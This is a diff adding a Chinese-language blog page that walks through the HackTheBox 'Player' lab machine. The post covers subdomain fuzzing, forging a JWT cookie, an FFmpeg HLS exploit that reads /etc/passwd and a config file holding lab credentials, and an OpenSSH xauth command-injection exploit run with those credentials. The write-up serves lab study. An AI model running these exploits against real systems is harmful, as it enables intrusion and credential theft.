@@ -1,0 +1,1070 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="今天是大年初四，我已经把无聊的电影都看了一遍。春节过得也太无聊了.. recon1nmap -sV -sT -sC -o nmapinitial player.htb  开放了80还有22端口 Web Enumeration访问http://player.htb/ 页面返回403-Forbidden 使用wfuzz与subdomains-top1mil-5000.txt来自seclists枚举子域">
+<meta name="keywords" content="Web安全，移动安全，windows安全，漏洞挖掘，代码审计，智能合约">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hackthebox Player">
+<meta property="og:url" content="https://wh0ale.github.io/2020/01/28/hackthebox-Player/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="今天是大年初四，我已经把无聊的电影都看了一遍。春节过得也太无聊了.. recon1nmap -sV -sT -sC -o nmapinitial player.htb  开放了80还有22端口 Web Enumeration访问http://player.htb/ 页面返回403-Forbidden 使用wfuzz与subdomains-top1mil-5000.txt来自seclists枚举子域">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_16-39-37.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_16-36-35.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_17-14-40.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_17-18-17.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_17-22-59.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_17-48-23.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_17-54-06.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_18-01-01.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_18-01-38.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_20-04-45.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_20-18-00.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_20-19-31.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_20-22-13.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_00-26-08.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_00-26-09.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_17-12-16.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_17-29-46.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_17-33-49.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_17-45-47.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_18-08-51.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_18-04-59.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_22-02-40.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_22-59-22.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_23-04-41.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_23-47-18.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_23-40-47.png">
+<meta property="og:updated_time" content="2020-01-29T16:02:13.585Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="hackthebox Player">
+<meta name="twitter:description" content="今天是大年初四，我已经把无聊的电影都看了一遍。春节过得也太无聊了.. recon1nmap -sV -sT -sC -o nmapinitial player.htb  开放了80还有22端口 Web Enumeration访问http://player.htb/ 页面返回403-Forbidden 使用wfuzz与subdomains-top1mil-5000.txt来自seclists枚举子域">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_16-39-37.png">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2020/01/28/hackthebox-Player/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>hackthebox Player | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2020/01/28/hackthebox-Player/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">hackthebox Player
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-01-28 15:49:28" itemprop="dateCreated datePublished" datetime="2020-01-28T15:49:28+08:00">2020-01-28</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2020-01-30 00:02:13" itemprop="dateModified" datetime="2020-01-30T00:02:13+08:00">2020-01-30</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">11k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">10 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <p>今天是大年初四，我已经把无聊的电影都看了一遍。春节过得也太无聊了..</p>
+<h1 id="recon"><a href="#recon" class="headerlink" title="recon"></a>recon</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -sC -o nmapinitial player.htb</span><br></pre></td></tr></table></figure>
+
+<p>开放了<code>80</code>还有<code>22</code>端口</p>
+<h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>访问<code>http://player.htb/</code></p>
+<p>页面返回403-Forbidden</p>
+<p>使用wfuzz与<a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt" target="_blank" rel="noopener"><code>subdomains-top1mil-5000.txt</code></a>来自<a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener"><code>seclists</code></a>枚举子域名，并得到这些结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz --hc 403 -c -w subdomains-top1million-5000.txt -H &quot;HOST: FUZZ.player.htb&quot; http://10.10.10.145</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_16-39-37.png" alt></p>
+<p>将得到的结果添加入host</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_16-36-35.png" alt></p>
+<p>三个子域名逐个访问</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_17-14-40.png" alt></p>
+<p>发现<code>http://staging.player.htb/</code>存在有意思的点</p>
+<p>再留言处提交留言，会跳转到501.php</p>
+<p>观察第三个数据包的响应包</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_17-18-17.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Tue, 28 Jan 2020 09:14:59 GMT</span><br><span class="line">Server: Apache/2.4.7 (Ubuntu)</span><br><span class="line">X-Powered-By: PHP/5.5.9-1ubuntu4.26</span><br><span class="line">refresh: 0;url=501.php</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 818</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">array(3) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  array(4) &#123;</span><br><span class="line">    [&quot;file&quot;]=&gt;</span><br><span class="line">    string(28) &quot;/var/www/staging/contact.php&quot;</span><br><span class="line">    [&quot;line&quot;]=&gt;</span><br><span class="line">    int(6)</span><br><span class="line">    [&quot;function&quot;]=&gt;</span><br><span class="line">    string(1) &quot;c&quot;</span><br><span class="line">    [&quot;args&quot;]=&gt;</span><br><span class="line">    array(1) &#123;</span><br><span class="line">      [0]=&gt;</span><br><span class="line">      &amp;string(9) &quot;Cleveland&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  array(4) &#123;</span><br><span class="line">    [&quot;file&quot;]=&gt;</span><br><span class="line">    string(28) &quot;/var/www/staging/contact.php&quot;</span><br><span class="line">    [&quot;line&quot;]=&gt;</span><br><span class="line">    int(3)</span><br><span class="line">    [&quot;function&quot;]=&gt;</span><br><span class="line">    string(1) &quot;b&quot;</span><br><span class="line">    [&quot;args&quot;]=&gt;</span><br><span class="line">    array(1) &#123;</span><br><span class="line">      [0]=&gt;</span><br><span class="line">      &amp;string(5) &quot;Glenn&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  array(4) &#123;</span><br><span class="line">    [&quot;file&quot;]=&gt;</span><br><span class="line">    string(28) &quot;/var/www/staging/contact.php&quot;</span><br><span class="line">    [&quot;line&quot;]=&gt;</span><br><span class="line">    int(11)</span><br><span class="line">    [&quot;function&quot;]=&gt;</span><br><span class="line">    string(1) &quot;a&quot;</span><br><span class="line">    [&quot;args&quot;]=&gt;</span><br><span class="line">    array(1) &#123;</span><br><span class="line">      [0]=&gt;</span><br><span class="line">      &amp;string(5) &quot;Peter&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Database connection failed.&lt;html&gt;&lt;br /&gt;Unknown variable user in /var/www/backup/service_config fatal error in /var/www/staging/fix.php</span><br></pre></td></tr></table></figure>
+
+<p>可以看到泄露路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/www/staging/contact.php</span><br><span class="line">/var/www/backup/service_config</span><br><span class="line">var/www/staging/fix.php</span><br></pre></td></tr></table></figure>
+
+<p>在<code>http://chat.player.htb/</code>看到Olla和Vincent之间的聊天记录，Olla向他询问了一些渗透测试报告，他回答了2件事：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_17-22-59.png" alt></p>
+<ol>
+<li>分阶段公开敏感文件。</li>
+<li>主域公开源代码，允许在发布之前访问产品。</li>
+</ol>
+<p>对主域名进行目录暴破</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wfuzz --hc 404 -c -w /usr/share/wordlists/dirb/common.txt http://player.htb/FUZZ</span><br><span class="line">000000001:   403        10 L     30 W     277 Ch      &quot;&quot;</span><br><span class="line">000000011:   403        10 L     30 W     281 Ch      &quot;.hta&quot;</span><br><span class="line">000000012:   403        10 L     30 W     286 Ch      &quot;.htaccess&quot;</span><br><span class="line">000000013:   403        10 L     30 W     286 Ch      &quot;.htpasswd&quot;</span><br><span class="line">000002250:   301        9 L      28 W     310 Ch      &quot;launcher&quot;</span><br><span class="line">000003588:   403        10 L     30 W     290 Ch      &quot;server-status&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_17-48-23.png" alt></p>
+<p>访问<code>http://player.htb/launcher</code></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_17-54-06.png" alt></p>
+<p>输入表单，会自动跳转到<code>http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php?</code></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_18-01-01.png" alt></p>
+<p>从聊天中我们知道源代码暴露在某个地方，我想阅读源代码，<code>http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786e.php.</code>因此我尝试了一些基本的操作，例如添加<code>.swp</code>，<code>.bak</code>以及<code>~</code>在文件名之后。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_18-01-38.png" alt></p>
+<p>看到了<code>jwt</code>这个关键点</p>
+<p>在<a href="https://jwt.io/" target="_blank" rel="noopener">jwt</a>中，对cookie进行解码</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_20-04-45.png" alt></p>
+<p>上述代码的意思是</p>
+<blockquote>
+<p>如果cookie通过&#39;HS256&#39;解码的值为&quot;0E76658526655756207688271159624026011393&quot;的话，则跳转到 7F2xxxxxxxxxxxxx/ </p>
+<p>如果cookie通过&#39;HS256&#39;解码的值不为&quot;0E76658526655756207688271159624026011393&quot;的话，跳转到index.html，就是刚才跳转的页面</p>
+</blockquote>
+<p>所以我们需要重新制造一个cookie</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IjBFNzY2NTg1MjY2NTU3NTYyMDc2ODgyNzExNTk2MjQwMjYwMTEzOTMifQ.VXuTKqw__J4YgcgtOdNDgsLgrFjhN1_WwspYNf_FjyE</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_20-18-00.png" alt></p>
+<p>可以看到cookie变更后来到了新的页面</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_20-19-31.png" alt></p>
+<h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><h2 id="FFmpeg-HLS漏洞–-gt-任意文件读取"><a href="#FFmpeg-HLS漏洞–-gt-任意文件读取" class="headerlink" title="FFmpeg HLS漏洞–&gt;任意文件读取"></a>FFmpeg HLS漏洞–&gt;任意文件读取</h2><p>新的页面存在上传文件功能</p>
+<p>上传文件后发现新增了一个按钮，F12查看下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;http:\/\/player.htb/launcher/7F2dcsSdZo6nj3SNMTQ1/uploads/1526724324.avi&quot;&gt;Buffed Media&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-28_20-22-13.png" alt></p>
+<p>尝试上传一些其他格式的文件，返回的都是avi的文件类型</p>
+<p>因此，我尝试了该<code>ffmpeg HLS</code><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS" target="_blank" rel="noopener">exp</a>，并创建了一个<code>avi</code>要读取的测试<code>/etc/passwd</code>，它的工作原理是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./gen_xbin_avi.py file:///etc/passwd test.avi</span><br><span class="line">file test.avi</span><br><span class="line">test.avi: RIFF (little-endian) data, AVI, 224 x 160, 25.00 fps,</span><br></pre></td></tr></table></figure>
+
+<p>上传后点击<code>Buffed Media</code></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_00-26-08.png" alt></p>
+<p>创建读取其他文件的avi</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./gen_xbin_avi.py file:///var/www/staging/contact.php contact.avi</span><br><span class="line">./gen_xbin_avi.py file:///var/www/backup/service_config service_config.avi</span><br><span class="line">./gen_xbin_avi.py file:///var/www/staging/fix.php fix.avi</span><br></pre></td></tr></table></figure>
+
+<p><code>contact.php</code>没有任何有趣的内容，<code>avi</code>for <code>fix.php</code>为空。其中<code>service_config</code>有一个名为的用户凭据<code>telegen</code>：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_00-26-09.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: telegen</span><br><span class="line">password: d-bC|jC!2uepS/w</span><br></pre></td></tr></table></figure>
+
+<p>尝试登陆<code>http://dev.player.htb/</code>失败</p>
+<p>尝试登陆ssh(22)失败</p>
+<p>使用masscan快速扫描开放端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">masscan -p1-65535 10.10.10.145 --rate=1000 -e eth0</span><br><span class="line"></span><br><span class="line">Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-29 08:59:36 GMT</span><br><span class="line"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [65535 ports/host]</span><br><span class="line">Discovered open port 22/tcp on 10.10.10.145</span><br><span class="line">Discovered open port 80/tcp on 10.10.10.145</span><br><span class="line">Discovered open port 6686/tcp on 10.10.10.145</span><br><span class="line">rate:  0.00-kpps, 100.00% done, waiting -29-secs, found=3</span><br></pre></td></tr></table></figure>
+
+<p>nmap扫描端口详情</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 6686 -sT -sV --version-all 10.10.10.145             </span><br><span class="line"></span><br><span class="line">Nmap scan report for player.htb (10.10.10.145)</span><br><span class="line">Host is up (0.40s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">6686/tcp open  tcpwrapped</span><br></pre></td></tr></table></figure>
+
+<p>使用nc探测端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~ # nc player.htb 6686</span><br><span class="line">SSH-2.0-OpenSSH_7.2</span><br></pre></td></tr></table></figure>
+
+<p>发现可以ssh连接6686端口，连接上ssh后没有执行命令的权限</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_17-12-16.png" alt></p>
+<p>猜测6686端口应该是<strong>Dropbear是一个相对较小的SSH服务器和客户端</strong>。开源，在无线路由器等嵌入式linux系统中使用较多。</p>
+<h2 id="xauth-Command-Injection"><a href="#xauth-Command-Injection" class="headerlink" title="xauth Command Injection"></a>xauth Command Injection</h2><p>searchsploit查找有没有openssh的漏洞，发现存在对应版本的漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit openssh</span><br><span class="line">OpenSSH 7.2p1 - (Authenticated) xauth Command Injection     | exploits/multiple/remote/39569.py</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python /usr/share/exploitdb/exploits/multiple/remote/39569.py player.htb 6686 telegen &apos;d-bC|jC!2uepS/w&apos;      </span><br><span class="line"></span><br><span class="line">INFO:__main__:connecting to: telegen:d-bC|jC!2uepS/w@player.htb:6686</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_17-29-46.png" alt></p>
